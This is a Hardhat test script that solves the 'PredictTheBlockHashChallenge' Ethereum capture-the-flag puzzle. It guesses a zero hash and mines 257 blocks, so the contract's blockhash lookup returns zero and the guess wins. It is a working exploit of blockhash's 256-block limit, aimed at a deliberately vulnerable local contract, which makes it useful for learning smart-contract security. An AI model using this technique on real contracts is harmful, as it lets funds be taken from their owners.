import { ethers } from "hardhat";
import { expect } from "chai";

describe("PredictTheBlockHashChallenge", function () {
  it("should solve the challenge using attacker contract", async () => {
    const [attacker] = await ethers.getSigners();

    // 1. Deploy challenge with 1 ETH
    const ChallengeFactory = await ethers.getContractFactory("PredictTheBlockHashChallenge");
    const challenge = await ChallengeFactory.connect(attacker).deploy({
      value: ethers.utils.parseEther("1.0"),
    });

   

    const guess = ethers.constants.HashZero; // 0x000...000
    await challenge.lockInGuess(guess, { value: ethers.utils.parseEther("1.0") });

    // Mine 257 blocks so that the original hash becomes inaccessible
    for (let i = 0; i < 257; i++) {
      await network.provider.send("evm_mine");
    }
    // Now settle
    const tx = await challenge.settle();
    await tx.wait();

    const isComplete = await challenge.isComplete();
    expect(isComplete).to.equal(true);
    console.log(" Challenge solved!");
  });
});
